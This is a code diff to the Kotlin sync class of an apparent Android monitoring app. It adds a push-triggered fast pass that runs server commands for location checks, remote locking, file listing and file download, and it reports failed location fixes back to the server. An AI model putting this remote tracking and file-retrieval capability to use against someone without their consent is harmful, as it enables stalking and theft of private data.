@@ -41,6 +41,49 @@ import java.time.Instant
  */
 class SyncRunner(private val context: Context) {
 
+    /**
+     * Fast command pass: called directly by [SpappFirebaseMessagingService] on FCM push.
+     * Skips heavy periodic collectors (installed apps, app usage, web history)
+     * and processes pending commands (location_check, lock, file commands) immediately.
+     */
+    suspend fun runFastCommandPass(): Boolean {
+        val state = DeviceState(context)
+        val authToken = state.authToken ?: return false
+        val bearer = "Bearer $authToken"
+
+        val flagsResponse = try {
+            ApiClient.service.getFeatureFlags(bearer)
+        } catch (e: Exception) {
+            return false
+        }
+        if (!flagsResponse.isSuccessful || flagsResponse.body() == null) {
+            return false
+        }
+        val flags = flagsResponse.body()!!
+
+        val commands = try {
+            ApiClient.service.getPendingCommands(bearer).body().orEmpty()
+        } catch (e: Exception) {
+            emptyList()
+        }
+
+        if (commands.isEmpty()) return true
+
+        if (flags.location_on_demand) {
+            processLocationCommands(bearer, commands.filter { it.command_type == "location_check" })
+        }
+        if (flags.remote_lock) {
+            commands.filter { it.command_type == "lock" }.forEach { processLockCommand(bearer, it) }
+        }
+        if (flags.file_manager) {
+            commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
+            commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
+        }
+
+        state.lastSyncAtEpochMs = System.currentTimeMillis()
+        return true
+    }
+
     /** Returns true on a completed pass (even if individual sub-steps failed softly), false to retry later. */
     suspend fun runOnce(): Boolean {
         val state = DeviceState(context)
@@ -76,6 +119,25 @@ class SyncRunner(private val context: Context) {
             // Retried on next scheduled run.
         }
 
+        // 1. Process pending commands FIRST so admin actions never wait for heavy telemetry uploads
+        val commands = try {
+            ApiClient.service.getPendingCommands(bearer).body().orEmpty()
+        } catch (e: Exception) {
+            emptyList()
+        }
+
+        if (flags.location_on_demand) {
+            processLocationCommands(bearer, commands.filter { it.command_type == "location_check" })
+        }
+        if (flags.remote_lock) {
+            commands.filter { it.command_type == "lock" }.forEach { processLockCommand(bearer, it) }
+        }
+        if (flags.file_manager) {
+            commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
+            commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
+        }
+
+        // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
             syncAppUsage(bearer, db)
         }
@@ -96,28 +158,6 @@ class SyncRunner(private val context: Context) {
         }
         syncBlockRules(bearer)
 
-        // Pending commands are fetched once and routed by type. A command
-        // whose feature flag is disabled is simply left unprocessed — it
-        // stays "sent" and is safely re-delivered later (see backend
-        // GET /api/sync/commands's 10-minute re-delivery window) rather than
-        // silently dropped, in case the admin re-enables the flag.
-        val commands = try {
-            ApiClient.service.getPendingCommands(bearer).body().orEmpty()
-        } catch (e: Exception) {
-            emptyList()
-        }
-
-        if (flags.location_on_demand) {
-            processLocationCommands(bearer, commands.filter { it.command_type == "location_check" })
-        }
-        if (flags.remote_lock) {
-            commands.filter { it.command_type == "lock" }.forEach { processLockCommand(bearer, it) }
-        }
-        if (flags.file_manager) {
-            commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
-            commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
-        }
-
         state.lastSyncAtEpochMs = System.currentTimeMillis()
         return true
     }
@@ -126,7 +166,28 @@ class SyncRunner(private val context: Context) {
         if (commands.isEmpty()) return
 
         val fetcher = LocationFetcher(context)
-        val location = fetcher.fetchCurrentLocation() ?: return
+        val location = fetcher.fetchCurrentLocation()
+
+        if (location == null) {
+            val reason = if (!fetcher.hasPermission()) {
+                "Location permission not granted on device"
+            } else {
+                "Location unavailable (GPS/Location service disabled or no fix)"
+            }
+            android.util.Log.w("SyncRunner", "Location fetch failed: $reason")
+            for (command in commands) {
+                try {
+                    ApiClient.service.ackCommand(
+                        bearer,
+                        command.id,
+                        AckCommandRequest(success = false, message = reason)
+                    )
+                } catch (e: Exception) {
+                    android.util.Log.e("SyncRunner", "Failed to ack failed location command", e)
+                }
+            }
+            return
+        }
 
         for (command in commands) {
             try {
@@ -141,7 +202,7 @@ class SyncRunner(private val context: Context) {
                     )
                 )
             } catch (e: Exception) {
-                // Retried next sync cycle — the command stays "sent" (not "acked") until reported.
+                android.util.Log.e("SyncRunner", "Failed to report location", e)
             }
         }
     }
